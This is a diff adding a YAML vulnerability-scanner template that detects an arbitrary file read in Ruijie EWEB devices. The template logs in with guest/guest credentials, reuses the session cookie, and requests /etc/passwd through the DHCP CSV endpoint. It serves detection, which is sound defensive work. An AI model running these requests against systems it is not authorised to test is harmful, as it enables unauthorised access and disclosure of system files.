@@ -1,0 +1,56 @@
+id: ruijie-eweb-dhcp-anyfile-read
+info:
+  name: Ruijie EWEB DHCP File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+flow: http(1) && http(2)
+
+http:
+  - id: login
+    method: POST
+    path:
+      - "{{BaseURL}}/ddi/server/login.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=guest&password=guest?"
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        regex:
+          - "RUIJIEID=(.*?);"
+
+  - id: file-read
+    method: POST
+    path:
+      - "{{BaseURL}}/ddi/server/dhcp.php?a=csv"
+    headers:
+      Cookie: "RUIJIEID={{cookie}}; user=guest"
+      Content-Type: application/x-www-form-urlencoded
+    body: "filePath=/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "text/json"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
